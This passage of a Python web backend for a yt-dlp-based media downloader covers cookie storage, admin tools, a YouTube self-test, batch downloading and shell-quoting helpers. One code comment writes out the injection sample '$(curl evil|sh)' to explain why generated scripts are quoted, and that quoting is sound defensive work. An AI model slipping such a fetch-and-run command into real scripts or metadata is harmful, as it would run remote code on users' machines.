    that has no session here — a document that only a logged-in browser can
    fetch is useless for that. It contains the schema and nothing else: no
    user data, no episodes, no tokens.
    """
    base = f"{request.url.scheme}://{request.url.netloc}"
    return PlainTextResponse(podcast.order_sheet_brief(base),
                             media_type="text/markdown; charset=utf-8",
                             headers={"Content-Disposition":
                                      content_disposition("fundus-auftragszettel.md", "inline")})


# ── Per-user Instagram cookies ────────────────────────────────────────────────

COOKIE_HINTS = {
    "instagram": (".instagram.com", "Instagram"),
    "youtube": (".youtube.com", "YouTube"),
}


def _merged_cookie_jar(user_id: int | None) -> str:
    """One Netscape jar holding every stored platform. A batch can mix
    Instagram and YouTube links, and yt-dlp picks lines by domain anyway."""
    if not user_id:
        return ""
    parts = [db.get_cookies(user_id, k).strip() for k in db.COOKIE_COLUMNS]
    parts = [p for p in parts if p]
    if not parts:
        return ""
    if len(parts) == 1:
        return parts[0]
    # Strip the header from every jar but the first — one file, one header.
    body = [parts[0]] + ["\n".join(l for l in p.splitlines() if not l.startswith("#"))
                         for p in parts[1:]]
    return "\n".join(body)


def _cookie_info(text: str, kind: str) -> dict:
    """Summarise a stored cookie file without ever returning its contents."""
    text = (text or "").strip()
    if not text:
        return {"saved": False, "lines": 0, "matches_platform": False}
    domain, _ = COOKIE_HINTS[kind]
    lines = [l for l in text.splitlines() if l.strip() and not l.startswith("#")]
    return {
        "saved": True,
        "lines": len(lines),
        "matches_platform": domain in text or domain.lstrip(".") in text,
    }


def _validate_cookies(text: str, kind: str) -> str:
    text = (text or "").strip()
    if "# Netscape" not in text and "\t" not in text:
        raise HTTPException(400, "Kein gültiges Netscape-Cookie-Format (Tab-getrennt). "
                                 "Die Extension muss „Netscape“ exportieren, nicht JSON.")
    domain, label = COOKIE_HINTS[kind]
    if domain not in text and domain.lstrip(".") not in text:
        other = "YouTube" if kind == "instagram" else "Instagram"
        raise HTTPException(400, f"Darin steht kein {label}-Cookie ({domain}). "
                                 f"Vielleicht die Datei für {other} erwischt?")
    return text


@app.get("/api/cookies")
async def cookies_status(user: dict = Depends(current_user)):
    """Status of every cookie store — never the values themselves."""
    return {
        "instagram": _cookie_info(db.get_cookies(user["id"], "instagram"), "instagram"),
        "youtube": _cookie_info(db.get_cookies(user["id"], "youtube"), "youtube"),
        # Kept for the older Instagram-only section of the UI.
        "saved": bool(db.get_cookies(user["id"], "instagram").strip()),
    }


@app.post("/api/cookies")
async def save_cookies(cookies: str = Form(""), kind: str = Form("instagram"),
                       user: dict = Depends(current_user)):
    if kind not in db.COOKIE_COLUMNS:
        raise HTTPException(400, "Unbekannte Cookie-Art.")
    text = cookies.strip()
    if not text:
        db.set_cookies(user["id"], kind, "")
        return {"saved": False}
    db.set_cookies(user["id"], kind, _validate_cookies(text, kind))
    return {"saved": True, **_cookie_info(text, kind)}


@app.delete("/api/cookies")
async def delete_cookies(kind: str = "instagram", user: dict = Depends(current_user)):
    if kind not in db.COOKIE_COLUMNS:
        raise HTTPException(400, "Unbekannte Cookie-Art.")
    db.set_cookies(user["id"], kind, "")
    return {"saved": False}


# ── Admin: users, moderation, stats ───────────────────────────────────────────

@app.get("/api/admin/stats")
async def admin_stats(admin: dict = Depends(require_admin)):
    s = db.stats()
    s["blocked_ips"] = db.list_blocked_ips()
    return s


@app.get("/api/admin/settings")
async def admin_get_settings(admin: dict = Depends(require_admin)):
    return {
        "merge_limit_enabled": db.get_setting("merge_limit_enabled", "1") == "1",
        "merge_max_clips": int(db.get_setting("merge_max_clips", str(MERGE_MAX_CLIPS)) or MERGE_MAX_CLIPS),
        "merge_max_seconds": int(db.get_setting("merge_max_seconds", str(MERGE_MAX_SECONDS)) or MERGE_MAX_SECONDS),
    }


@app.post("/api/admin/settings")
async def admin_set_settings(merge_limit_enabled: bool = Form(True),
                             merge_max_clips: int = Form(5),
                             merge_max_seconds: int = Form(900),
                             admin: dict = Depends(require_admin)):
    db.set_setting("merge_limit_enabled", "1" if merge_limit_enabled else "0")
    db.set_setting("merge_max_clips", str(max(1, merge_max_clips)))
    db.set_setting("merge_max_seconds", str(max(30, merge_max_seconds)))
    return {"ok": True}


@app.post("/api/admin/user/{uid}/block")
async def admin_block(uid: int, blocked: bool = Form(True), admin: dict = Depends(require_admin)):
    if uid == admin["id"]:
        raise HTTPException(400, "Du kannst dich nicht selbst blockieren.")
    db.set_blocked(uid, blocked)
    return {"ok": True}


@app.delete("/api/admin/user/{uid}")
async def admin_delete(uid: int, admin: dict = Depends(require_admin)):
    if uid == admin["id"]:
        raise HTTPException(400, "Du kannst dich nicht selbst löschen.")
    db.delete_user(uid)
    return {"ok": True}


def _own_errors(user: dict) -> list[dict]:
    """Die Fehler, die dieser Mensch sehen darf.

    Das Protokoll lag bisher nur im Admin-Bereich — und der ist im lokalen
    Modus ausgeblendet, weil es dort nichts zu verwalten gibt. Folge: auf dem
    Desktop sah der Nutzer seine eigenen Fehler nie, obwohl genau dort die
    interessanten auftreten (403 von YouTube, fehlende Werkzeuge, abgebrochene
    Downloads). Er bekam nur die Meldung am Job und sonst nichts.

    Auf einem Server darf das Protokoll nicht einfach aufgehen: die Einträge
    enthalten URLs und Benutzernamen anderer Leute. Deshalb sieht dort jeder
    nur seine eigenen Zeilen; der Administrator behält über
    /api/admin/errors den vollen Blick.
    """
    if DESKTOP_MODE or user.get("is_admin"):
        return list(_error_log)
    name = user.get("username") or ""
    return [e for e in _error_log if e.get("user") == name]


@app.get("/api/errors")
async def own_errors(user: dict = Depends(current_user)):
    items = _own_errors(user)
    return {"count": len(items), "max": ERROR_LOG_MAX,
            # scrub() ist hier nicht redundant: log_error schreibt die
            # Meldung ungefiltert, und yt-dlp echot die vollständige
            # Proxy-URL samt Zugangsdaten in seine Fehler.
            "items": [{**e, "message": scrub(e.get("message", "")),
                       "url": scrub(e.get("url", ""))} for e in items]}


@app.delete("/api/errors")
async def own_errors_clear(user: dict = Depends(current_user)):
    """Löschen heißt: die eigenen Zeilen, nicht die aller anderen."""
    before = len(_error_log)
    if DESKTOP_MODE or user.get("is_admin"):
        _error_log.clear()
    else:
        name = user.get("username") or ""
        keep = [e for e in _error_log if e.get("user") != name]
        _error_log.clear()
        _error_log.extendleft(reversed(keep))
    return {"ok": True, "cleared": before - len(_error_log)}


@app.get("/api/admin/errors")
async def admin_errors(admin: dict = Depends(require_admin)):
    return {"count": len(_error_log), "max": ERROR_LOG_MAX, "items": list(_error_log)}


@app.delete("/api/admin/errors")
async def admin_errors_clear(admin: dict = Depends(require_admin)):
    n = len(_error_log)
    _error_log.clear()
    return {"ok": True, "cleared": n}


@app.get("/api/admin/errors.md")
async def admin_errors_md(admin: dict = Depends(require_admin)):
    lines = [f"# Fundus — Fehlerprotokoll", "",
             f"Stand: {datetime.now().strftime('%d.%m.%Y %H:%M')} · {len(_error_log)} Einträge", ""]
    for e in _error_log:
        lines.append(f"### {e['at']} — {e['where']}")
        if e.get("user"):
            lines.append(f"- **Nutzer:** {e['user']}")
        if e.get("url"):
            lines.append(f"- **URL:** {e['url']}")
        lines += ["", "```", e["message"], "```", ""]
    stamp = datetime.now().strftime("%Y-%m-%d_%H%M")
    return PlainTextResponse("\n".join(lines), headers={
        "Content-Disposition": content_disposition(f"fundus-fehler_{stamp}.md"),
        "Content-Type": "text/markdown; charset=utf-8",
    })


@app.get("/api/admin/selftest")
async def admin_selftest(user: dict = Depends(require_admin)):
    """Answer the one question no amount of research can: is THIS server's IP
    allowed to talk to YouTube right now?

    Every check is independent and reports its own verdict, because the failure
    modes look identical from the UI but need opposite fixes: a missing JS
    runtime is a broken image, a refusal from YouTube is about this server's
    address, and no amount of reconfiguring helps with the wrong one.
    """
    checks: list[dict] = []

    async def _probe(cmd: list[str], timeout: int = 25) -> tuple[int, str, str]:
        try:
            proc = await asyncio.create_subprocess_exec(
                *cmd, stdout=asyncio.subprocess.PIPE, stderr=asyncio.subprocess.PIPE)
            out, err = await asyncio.wait_for(proc.communicate(), timeout=timeout)
            return proc.returncode, out.decode(errors="replace"), err.decode(errors="replace")
        except asyncio.TimeoutError:
            return -1, "", f"Zeitüberschreitung nach {timeout}s"
        except FileNotFoundError:
            return -2, "", "Programm nicht gefunden"
        except Exception as e:
            return -3, "", str(e)[:200]

    def add(name: str, ok: bool | None, detail: str, hint: str = ""):
        checks.append({"name": name, "ok": ok, "detail": detail.strip()[:400], "hint": hint})

    # 1. yt-dlp — version and whether it runs at all.
    #    Through _ytdlp_cmd(), not a bare "yt-dlp": this check exists to
    #    catch a stale extractor, and resolving it off PATH would report a
    #    different installation than the one doing the work. That is the
    #    exact bug it is here to find.
    code, out, err = await _probe(_ytdlp_cmd() + ["--version"], 15)
    add("yt-dlp", code == 0, out.strip() or err,
        "" if code == 0 else "Image neu bauen oder Selbst-Update prüfen.")

    # 2. JS runtime. Without it YouTube's n-challenge is unsolvable and only
    #    throttled formats come through — the single most misdiagnosed failure.
    code, out, err = await _probe(["deno", "--version"], 15)
    add("JavaScript-Runtime (Deno)", code == 0,
        (out.strip().splitlines() or [err])[0],
        "" if code == 0 else "Pflicht seit yt-dlp 2025.11.12 — fehlt im Image.")

    # 2b. ffmpeg and ffprobe. Everything that merges, converts, trims or reads
    #     a duration goes through them, and on a desktop install they are not
    #     part of the operating system — a Mac without Homebrew has neither.
    #     Without this check their absence shows up as a download that fails
    #     at the last step, which reads like a site problem.
    for tool in ("ffmpeg", "ffprobe"):
        code, out, err = await _probe([tool, "-version"], 15)
        first = (out.strip().splitlines() or [err.strip()] or [""])[0]
        add(tool, code == 0, first[:120],
            "" if code == 0 else
            ("Fundus richtet es beim ersten Start selbst ein — "
             "diese Meldung heißt, dass das nicht geklappt hat."
             if LOCAL_MODE else "Fehlt im Image."))

    # 3. Instance-specific checks, if any.
    if private_ext:
        await private_ext.selftest(add)

    # 4. The real question: does a plain YouTube extraction get through from
    #    this IP, with the configured clients? --simulate downloads nothing.
    #
    #    has_file_cookies=True suppresses the browser cookie jar. That reads
    #    backwards, and it is the point: the check has to answer "is this IP
    #    welcome", not "can we get in somehow". With cookies quietly attached
    #    it would report OK on an address YouTube refuses, which is the one
    #    answer that would send us looking in the wrong place again.
    # Creative Commons, Blender Foundation. Nicht beliebig gewählt: der
    # youtube-dl-Fall von 2020 wurde nach §1201 DMCA eingereicht und nannte
    # konkret die Musikvideos, die in den Tests abgerufen wurden; behoben
    # wurde er, indem genau diese Abrufe verschwanden. Eine Selbstprüfung,
    # die bei jedem Start ein kommerzielles Musikvideo anfasst, ist in einem
    # öffentlichen Repository ein unnötig gegebener Anlass.
    probe_url = os.environ.get("SELFTEST_URL",
                               "https://www.youtube.com/watch?v=aqz-KE-bpKQ")
    code, out, err = await _probe(
        _ytdlp_cmd() + ["--simulate", "--no-warnings", "--print", "%(title)s",
                        *_yt_extractor_args(True), "--", probe_url], 60)
    blob = (err or "") + (out or "")
    if code == 0 and out.strip():
        add("YouTube-Abruf ohne Cookies", True, f"OK · „{out.strip().splitlines()[0][:80]}“",
            f"Clients: {YT_CLIENTS}")
    elif "not a bot" in blob or "Sign in to confirm" in blob:
        add("YouTube-Abruf ohne Cookies", False,
            "YouTube lehnt Anfragen von dieser Server-Adresse ab "
            "(„Sign in to confirm you're not a bot“)",
            "Nutze die Desktop-App oder veröffentlichte Untertitel; "
            "Transkripte gehen auch über lokales Whisper.")
    else:
        add("YouTube-Abruf ohne Cookies", False, (err or "unbekannter Fehler")[:300],
            f"Clients: {YT_CLIENTS} — ggf. über YT_CLIENTS umstellen.")

    # 5. Subtitle endpoint, which is a separate route with its own blocking.
    code, out, err = await _probe(
        _ytdlp_cmd() + ["--list-subs", "--no-warnings", *_yt_extractor_args(True), "--", probe_url], 60)
    has = code == 0 and ("Available" in out or "auto" in out.lower())
    add("Untertitel-Abruf", has,
        "Untertitel werden gelistet" if has else (err or out or "keine Liste erhalten")[:250],
        "" if has else "Läuft über eine andere Route als der Video-Abruf — kann getrennt blocken.")

    # 6. Local transcription — the path that needs none of the above.
    if not WHISPER_ENABLED:
        add("Whisper (lokal)", None, "Abgeschaltet (WHISPER_ENABLED=0)", "")
    else:
        try:
            import faster_whisper  # noqa: F401
            cached = list(Path(WHISPER_MODEL_DIR).glob("**/model.bin"))
            add("Whisper (lokal)", True,
                f"Modell „{WHISPER_MODEL}“ · " +
                ("im Cache" if cached else "wird beim ersten Lauf geladen (~150 MB)"),
                "Greift, wenn YouTube gar keine Untertitel herausgibt.")
        except Exception as e:
            add("Whisper (lokal)", False, str(e)[:200], "faster-whisper fehlt im Image.")

    ok = sum(1 for c in checks if c["ok"] is True)
    bad = [c["name"] for c in checks if c["ok"] is False]
    return {
        "checks": checks,
        "summary": {"ok": ok, "failed": len(bad), "failing": bad,
                    "clients": YT_CLIENTS, "probe_url": probe_url},
    }


@app.post("/api/admin/abort-all")
async def admin_abort_all(admin: dict = Depends(require_admin)):
    """Emergency stop: kill every running yt-dlp/ffmpeg/gallery-dl process, mark
    open jobs as cancelled and clear the queue. For when a download gets stuck
    in a retry loop and the server is grinding."""
    killed = 0
    for name in ("yt-dlp", "ffmpeg", "gallery-dl"):
        try:
            proc = await asyncio.create_subprocess_exec(
                "pkill", "-f", name,
                stdout=asyncio.subprocess.DEVNULL, stderr=asyncio.subprocess.DEVNULL)
            await proc.wait()
            if proc.returncode == 0:
                killed += 1
        except Exception:
            pass

    stopped = 0
    for jid, job in list(jobs.items()):
        if job.get("status") in ("pending", "running"):
            job.update({"status": "error", "error": "Vom Admin abgebrochen."})
            stopped += 1
    for bid, batch in list(batches.items()):
        if batch.get("status") in ("running", "merging"):
            batch.update({"status": "error", "error": "Vom Admin abgebrochen."})

    _cleanup_old_files(0)          # drop partial files from the aborted jobs
    _prune_state(0)
    return {"ok": True, "processes": killed, "jobs": stopped}


@app.post("/api/admin/block-ip")
async def admin_block_ip(ip: str = Form(...), admin: dict = Depends(require_admin)):
    db.block_ip(ip.strip())
    return {"ok": True}


@app.delete("/api/admin/block-ip")
async def admin_unblock_ip(ip: str = Form(...), admin: dict = Depends(require_admin)):
    db.unblock_ip(ip.strip())
    return {"ok": True}


# ── Batch download + optional merge ──────────────────────────────────────────

# Server-merge guardrails: beyond these, steer the user to the local script.
MERGE_MAX_CLIPS = int(os.environ.get("MERGE_MAX_CLIPS", "5"))
MERGE_MAX_SECONDS = int(os.environ.get("MERGE_MAX_SECONDS", "900"))   # 15 min total


async def _total_duration(url_list: list[str], cookies: str) -> float:
    """Sum clip durations (fast metadata probe) to decide server vs local merge."""
    total = 0.0
    args_base = ["--skip-download", "--no-playlist", "--print", "%(duration)s"]
    ck = None
    if cookies.strip():
        ck = TMP_DIR / f"probe_{uuid.uuid4().hex}.txt"; ck.write_text(cookies.strip())
    try:
        for u in url_list:
            a = (["--cookies", str(ck)] if ck else []) + args_base + ["--", u]
            _, out, _ = await run_ytdlp(a)
            for line in (out or "").strip().splitlines():
                try:
                    total += float(line.strip()); break
                except ValueError:
                    continue
    finally:
        if ck and ck.exists():
            ck.unlink()
    return total


@app.post("/api/batch")
async def batch(
    background_tasks: BackgroundTasks,
    urls: str = Form(...),
    quality: str = Form("best"),
    audio_only: bool = Form(False),
    merge: bool = Form(False),
    merge_resolution: str = Form("1080x1920"),
    cookies: str = Form(""),
    include_transcripts: bool = Form(False),
    all_parts: bool = Form(False),
    text_only: bool = Form(False),
    # Welche Medien aus einem Beitrag. Ein Karussell kann Fotos UND Videos
    # enthalten, und bisher kam immer alles — „nur die Fotos" ließ sich gar
    # nicht ausdrücken. Der Modus hieß obendrein „Video", was bei einem
    # Fotobeitrag schlicht falsch ist.
    media: str = Form("alle"),
    audio_format: str = Form("mp3"),
    stills: str = Form("off"),
    discard_video: bool = Form(False),
    pack: bool = Form(False),
    user: dict = Depends(current_user),
):
    url_list = [
        u.strip() for u in urls.splitlines()
        if u.strip() and re.match(r"https?://", u.strip(), re.I)
    ]
    if not url_list:
        raise HTTPException(400, "Keine gültigen URLs gefunden")

    # Same post pasted twice (or once with ?img_index=, once without) → drop it.
    url_list, dupe_urls = dedupe_urls(url_list)

    if len(url_list) > BATCH_MAX_URLS:
        raise HTTPException(
            400, f"{len(url_list)} URLs auf einmal ist zu viel (max. {BATCH_MAX_URLS}). "
                 f"Downloads laufen nacheinander — das wären grob "
                 f"{len(url_list) * SECONDS_PER_URL // 60} Minuten. "
                 "Bitte in kleineren Portionen schicken.")

    # Operator opt-out: transcripts stay available, media downloads do not.
    if not youtube_video_enabled() and not text_only:
        yt = [u for u in url_list if _is_youtube(u)]
        if yt:
            raise HTTPException(403,
                                "YouTube-Downloads sind auf dieser Instanz deaktiviert. "
                                "Transkripte funktionieren weiterhin.")

    _batch_throttle(user["id"], len(url_list))

    # Per-user cookies: request-supplied win, else the user's saved stores.
    # A batch may mix platforms, so both jars go in — yt-dlp matches by domain.
    resolved_cookies = cookies.strip() or _merged_cookie_jar(user["id"])

    # Auto-guardrail (admin-configurable): too many/long clips → hand back a local
    # merge script instead of grinding the small server through a heavy re-encode.
    if merge and not text_only and db.get_setting("merge_limit_enabled", "1") == "1":
        max_clips = int(db.get_setting("merge_max_clips", str(MERGE_MAX_CLIPS)) or MERGE_MAX_CLIPS)
        max_sec = int(db.get_setting("merge_max_seconds", str(MERGE_MAX_SECONDS)) or MERGE_MAX_SECONDS)
        if len(url_list) > max_clips:
            return {"use_local_script": True,
                    "reason": f"{len(url_list)} Clips — mehr als {max_clips}. Lokal mergen ist schneller.",
                    "script": build_download_script(url_list, quality, audio_only, True, merge_resolution)}
        dur = await _total_duration(url_list, resolved_cookies)
        if dur > max_sec:
            return {"use_local_script": True,
                    "reason": f"Gesamtlänge ~{int(dur//60)} Min — zu schwer für den Server-Merge. Lokal geht's schnell.",
                    "script": build_download_script(url_list, quality, audio_only, True, merge_resolution)}

    if media not in ("alle", "fotos", "videos"):
        raise HTTPException(400, "Unbekannte Medienauswahl.")
    if audio_format not in AUDIO_FORMATS:
        raise HTTPException(400, "Unbekanntes Audioformat.")

    batch_id = str(uuid.uuid4())
    job_ids = []
    for url in url_list:
        jid = str(uuid.uuid4())
        jobs[jid] = {"status": "pending", "url": url, "user_id": user["id"],
                     "media": media, "audio_fmt": audio_format,
                     "created": datetime.now().isoformat()}
        job_ids.append(jid)

    batches[batch_id] = {
        "status": "running",
        "job_ids": job_ids,
        "duplicates": dupe_urls,
        "started_at": time.time(),
        "last_change": time.time(),
        "merge": merge,
        "merge_resolution": merge_resolution,
        "include_transcripts": include_transcripts,
        "text_only": text_only,
        "user_id": user["id"],
        "created": datetime.now().isoformat(),
    }

    kind = ("text" if text_only else "audio" if audio_only else "pack" if pack
            else "merge" if merge else "media")
    background_tasks.add_task(
        _remembered, _batch_job(batch_id, url_list, job_ids, quality, audio_only,
                                merge, merge_resolution, resolved_cookies,
                                include_transcripts, all_parts, text_only, user["id"],
                                stills, discard_video, pack),
        lambda: [(kind, jobs.get(j, {}).get("url", ""), _job_title(j))
                 for j in job_ids if jobs.get(j, {}).get("status") == "done"])
    return {"batch_id": batch_id, "job_ids": job_ids, "duplicates": dupe_urls}


@app.get("/api/batch/{batch_id}")
async def batch_status(batch_id: str, request: Request, user: dict = Depends(current_user)):
    b = batches.get(batch_id)
    if not b or b.get("user_id") != user["id"]:
        raise HTTPException(404, "Batch not found")
    job_list = [jobs.get(jid, {"status": "unknown"}) for jid in b["job_ids"]]
    result = dict(b)
    result["jobs"] = job_list

    # Aggregate view — with 100 URLs the per-job rows are unreadable on their own.
    done = sum(1 for j in job_list if j.get("status") == "done")
    failed = sum(1 for j in job_list if j.get("status") == "error")
    running = next((j for j in job_list if j.get("status") == "running"), None)
    total = len(job_list) or 1
    finished = done + failed

    started = b.get("started_at")
    elapsed = (time.time() - started) if started else 0
    eta = int((elapsed / finished) * (total - finished)) if finished and elapsed else None

    result["overview"] = {
        "total": total, "done": done, "failed": failed, "finished": finished,
        "percent": round(finished / total * 100),
        "elapsed": int(elapsed),
        "eta": eta,
        "current": (running or {}).get("url", ""),
        "current_progress": (running or {}).get("progress", 0),
        # Watchdog: how long since anything last changed. The UI warns when this
        # grows — a stuck download should look stuck, not idle.
        "stalled_for": int(time.time() - b.get("last_change", started or time.time())),
    }
    return _localized(request, result)


def _owned_batch(batch_id: str, user: dict) -> dict:
    b = batches.get(batch_id)
    if not b or b.get("user_id") != user["id"]:
        raise HTTPException(404, "Batch not found")
    return b


@app.get("/api/download-batch/{batch_id}")
async def download_batch_file(batch_id: str, user: dict = Depends(current_user)):
    b = _owned_batch(batch_id, user)
    if not b.get("merged_file"):
        raise HTTPException(404, "Merged file not ready")
    fp = Path(b["merged_file"])
    if not fp.exists():
        raise HTTPException(404, "File gone")
    return FileResponse(
        fp, media_type="application/octet-stream", filename=fp.name,
        headers={"Content-Disposition": content_disposition(fp.name)},
    )


@app.get("/api/batch/{batch_id}/zip")
async def download_batch_zip(batch_id: str, user: dict = Depends(current_user)):
    import zipfile
    b = _owned_batch(batch_id, user)
    files = [f for f in b.get("all_files", []) if Path(f).exists()]
    if not files:
        raise HTTPException(404, "Keine Dateien im Batch")
    zip_path = DOWNLOAD_DIR / f"download_{batch_id[:8]}.zip"
    with zipfile.ZipFile(zip_path, "w", zipfile.ZIP_STORED) as z:
        for f in files:
            z.write(f, Path(f).name)
        md = (b or {}).get("metadata_md")
        if md and Path(md).exists():
            z.write(md, Path(md).name)
    return FileResponse(
        zip_path, media_type="application/zip", filename=zip_path.name,
        headers={"Content-Disposition": content_disposition(zip_path.name)},
    )


@app.get("/api/batch/{batch_id}/metadata.{fmt}")
async def download_batch_metadata(batch_id: str, fmt: str, user: dict = Depends(current_user)):
    b = _owned_batch(batch_id, user)
    key = "metadata_md" if fmt == "md" else "metadata_json"
    if not b.get(key):
        raise HTTPException(404, "Metadata not ready")
    fp = Path(b[key])
    if not fp.exists():
        raise HTTPException(404, "File gone")
    media = "text/markdown" if fmt == "md" else "application/json"
    return FileResponse(
        fp, media_type=media, filename=fp.name,
        headers={"Content-Disposition": content_disposition(fp.name)},
    )


async def _batch_job(
    batch_id: str,
    url_list: list[str],
    job_ids: list[str],
    quality: str,
    audio_only: bool,
    merge: bool,
    merge_resolution: str,
    cookies: str,
    include_transcripts: bool = False,
    all_parts: bool = False,
    text_only: bool = False,
    user_id: int | None = None,
    stills: str = "off",
    discard_video: bool = False,
    pack: bool = False,
):
    # ── Ingest mode: transcript + metadata only, no video download. ──
    if text_only:
        ok = 0
        for jid, url in zip(job_ids, url_list):
            jobs[jid]["status"] = "running"
            batches[batch_id]["last_change"] = time.time()

            # Threads: the post text *is* the content — read it without media.
            if _is_threads(url):
                tmp_job = f"{jid}_t"
                jobs[tmp_job] = {"status": "pending"}
                await _download_threads(tmp_job, url, cookies, False)
                src = jobs.pop(tmp_job, {})
                for p in src.get("filepaths", []):
                    if not p.endswith((".md", ".txt")):
                        Path(p).unlink(missing_ok=True)
                body = src.get("transcript", "")
                jobs[jid].update({
                    "status": "done" if body else "error",
                    "meta": src.get("meta", {"extractor": "Threads", "webpage_url": url}),
                    "transcript": body, "caption": "",
                    "filename": (src.get("meta") or {}).get("title") or url,
                })
                if body:
                    ok += 1
                    db.log_event(user_id, "ingest")
                else:
                    jobs[jid]["error"] = src.get("error", "Kein Text im Threads-Post gefunden.")
                continue

            meta = await _fetch_light_meta(url, cookies)
            text = await _grab_subs_text(jid + "_t", url, cookies)
            caption = "" if text else await _fetch_caption(url)
            body = text or caption
            jobs[jid].update({
                "status": "done" if body or meta.get("title") else "error",
                "meta": {**meta, "extractor": _platform_of(url)},
                "transcript": text, "caption": caption,
                "filename": meta.get("title") or url,
            })
            if jobs[jid]["status"] == "done":
                ok += 1
                db.log_event(user_id, "ingest")
            else:
                jobs[jid]["error"] = "Weder Untertitel noch Caption gefunden."
        batches[batch_id]["ok"] = ok
        batches[batch_id]["failed"] = len(job_ids) - ok
        if ok:
            _write_metadata_sidecar(batch_id, job_ids)
        batches[batch_id]["status"] = "done" if ok else "error"
        if not ok:
            batches[batch_id]["error"] = "Kein Text gefunden (keine Untertitel/Caption)."
        return

    filepaths = []
    all_files: list[str] = []
    # Sequential to avoid Instagram rate limits
    for jid, url in zip(job_ids, url_list):
        batches[batch_id]["last_change"] = time.time()
        fp = await _download_url(jid, url, cookies, quality, audio_only, all_parts)
        batches[batch_id]["last_change"] = time.time()
        if fp:
            filepaths.append(fp)
            # Optional visual-AI extras: stills (+ audio if the video is discarded).
            # Only meaningful for videos — an Instagram image post or a Threads
            # text post has no frames to grab and must not be deleted.
            extras: list[str] = []
            is_video = fp.lower().endswith((".mp4", ".mov", ".webm", ".mkv"))
            if is_video and not audio_only and (stills != "off" or discard_video):
                dur = (jobs[jid].get("meta") or {}).get("duration")
                if stills != "off":
                    shots = await _extract_stills(fp, stills, dur)
                    extras += shots
                    jobs[jid]["stills"] = len(shots)
                if discard_video:
                    au = await _extract_audio_mp3(fp)
                    if au:
                        extras.append(au)
                    # Delete only the video files — keep sidecars (post.md, images).
                    keep = [p for p in jobs[jid].get("filepaths", [fp])
                            if not p.lower().endswith((".mp4", ".mov", ".webm", ".mkv"))]
                    for p in jobs[jid].get("filepaths", [fp]):
                        if p in keep:
                            continue
                        try:
                            Path(p).unlink()
                        except OSError:
                            pass
                    extras = keep + extras
                    jobs[jid]["filepaths"] = extras
                    jobs[jid]["filepath"] = extras[0] if extras else fp
                    jobs[jid]["filename"] = f"Audio + {jobs[jid].get('stills', 0)} Stills"
                else:
                    jobs[jid]["filepaths"] = jobs[jid].get("filepaths", [fp]) + extras
            all_files.extend(jobs[jid].get("filepaths", [fp]))
            db.log_event(user_id, "download")
            if include_transcripts:
                jobs[jid]["transcript"] = await _grab_subs_text(jid + "_t", url, cookies)

    ok = len(filepaths)
    total = len(job_ids)
    batches[batch_id]["ok"] = ok
    batches[batch_id]["failed"] = total - ok

    if ok == 0:
        # Nothing downloaded — surface the failure instead of a green "done".
        batches[batch_id]["status"] = "error"
        batches[batch_id]["error"] = (
            f"0 von {total} Downloads erfolgreich. "
            "Für private/18+ Inhalte Cookies hinterlegen."
        )
        return

    # Identical content pulled from two different URLs → keep one copy.
    all_files, dropped = _dedupe_files(all_files)
    if dropped:
        gone = set(dropped)
        filepaths = [f for f in filepaths if f not in gone]
        for jid in job_ids:
            jp = [f for f in jobs.get(jid, {}).get("filepaths", []) if f not in gone]
            if jp:
                jobs[jid]["filepaths"] = jp
                jobs[jid]["filepath"] = jp[0]
        batches[batch_id]["dupe_files"] = len(dropped)

    # AI-ready metadata sidecar (titles, links, descriptions, optional
    # transcripts) — only in Pack mode; plain downloads stay plain.
    if pack:
        _write_metadata_sidecar(batch_id, job_ids)
    batches[batch_id]["all_files"] = all_files
    batches[batch_id]["file_count"] = len(all_files)

    # Merge only works on videos — drop images/text sidecars from the concat list.
    if merge:
        filepaths = [f for f in filepaths if f.lower().endswith((".mp4", ".mov", ".webm", ".mkv"))]

    if merge and len(filepaths) >= 2:
        batches[batch_id]["status"] = "merging"
        merged = await _merge_videos(filepaths, merge_resolution)
        if merged:
            batches[batch_id]["merged_file"] = merged
            batches[batch_id]["merged_filename"] = Path(merged).name
        else:
            batches[batch_id]["status"] = "merge_error"
            batches[batch_id]["error"] = "ffmpeg merge fehlgeschlagen"
            return
    elif merge and len(filepaths) == 1:
        batches[batch_id]["merged_file"] = filepaths[0]
        batches[batch_id]["merged_filename"] = Path(filepaths[0]).name

    batches[batch_id]["status"] = "done"


async def _grab_subs_text(tmp_id: str, url: str, cookies: str = "") -> str:
    """Fetch native-language subtitles as plain text (empty if none exist)."""
    await _fetch_subs(tmp_id, url, "en,de", cookies)
    chosen = _pick_sub_file(tmp_id, "")
    text = segments_to_text(_parse_sub_file(chosen)) if chosen else ""
    for f in TMP_DIR.glob(f"{tmp_id}*"):
        f.unlink(missing_ok=True)
    return text


INSTALL_PREAMBLE = (
    "# ── Einmalige Installation (macOS) ─────────────────────────────\n"
    "# 1) Homebrew (falls nicht vorhanden): siehe https://brew.sh\n"
    "# 2) ffmpeg:  brew install ffmpeg\n"
    "# 3) yt-dlp (neueste Nightly) + Instagram-Impersonation:\n"
    "python3 -m pip install -U --pre \"yt-dlp[default]\" curl_cffi\n"
    "command -v ffmpeg >/dev/null 2>&1 || brew install ffmpeg\n"
)


# Target formats offered for merging. Key → (width, height, label).
MERGE_FORMATS = {
    "1080x1920": "9:16 — Reels / Shorts / TikTok",
    "1920x1080": "16:9 — YouTube / klassisch",
    "1080x1080": "1:1 — quadratisch",
    "1080x1350": "4:5 — Instagram-Feed",
    "1440x1080": "4:3 — klassisch TV",
}


# ── Quoting for generated scripts ─────────────────────────────────────────────
# Everything below exists because the output of these builders is a file the
# user double-clicks. Values reaching them come from podcast feeds, platform
# metadata and form fields — a show whose <itunes:author> is $(curl evil|sh)
# must not be able to put that into someone's shell.
#
# Inside zsh double quotes, $(…) and `…` still expand. Escaping only the quote
# character — which is what this code used to do — stops nothing.

def sh(value) -> str:
    """POSIX-quote a value for zsh/bash. Returns a quoted token, braces and all."""
    return shlex.quote(str(value if value is not None else ""))


def ps(value) -> str:
    """Quote for PowerShell single quotes, where only ' needs doubling and no
    expansion happens."""
    return "'" + str(value if value is not None else "").replace("'", "''") + "'"


_LANG_RE = re.compile(r"^[A-Za-z]{2,3}(?:-[A-Za-z0-9]{2,8})?$")


def safe_lang(value, fallback: str = "de") -> str:
    """A language tag, or the fallback.

    Feeds put anything in <language>, and an order sheet can set it directly.
    It lands next to a CLI flag, so it is an allowlist rather than quoting:
    a quoted but nonsensical value would only move the failure later.
    """
    v = str(value or "").strip()
    if not _LANG_RE.match(v):
        return fallback
    # Feeds say "en-us" or "de-DE"; Whisper (faster-whisper, mlx, the CLI
    # tools in the generated scripts) only knows the primary subtag and
